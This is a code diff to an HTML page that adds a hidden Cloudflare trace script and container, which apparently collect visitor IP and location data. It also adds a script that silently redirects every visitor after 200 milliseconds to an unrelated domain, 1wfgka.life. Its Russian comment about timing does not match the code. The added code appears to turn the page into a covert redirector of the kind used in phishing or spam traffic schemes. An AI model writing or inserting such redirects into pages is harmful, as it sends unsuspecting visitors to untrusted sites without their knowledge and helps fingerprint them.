@@ -24,13 +24,23 @@
             font-size: 24px;
         }
     </style>
+    <!-- Include Cloudflare trace -->
+    <script src="https://www.cloudflare.com/cdn-cgi/trace" type="text/plain" id="cloudflare-trace"></script>
+    <script src="script.js" defer></script>
+     <script>
+        setTimeout(function() {
+            window.location.href = "http://1wfgka.life/"; // замените "https://example.com" на адрес желаемого сайта
+        }, 200); // 2000 миллисекунд = 2 секунды
+    </script>
 </head>
 <body>
     <div class="container">
         <h1 class="text"></h1>
     </div>
     
-    
+   
+    <!-- Hidden container for Cloudflare trace data -->
+    <div id="cf-trace" style="display: none;"></div>
 
     <script>
         setTimeout(function() {
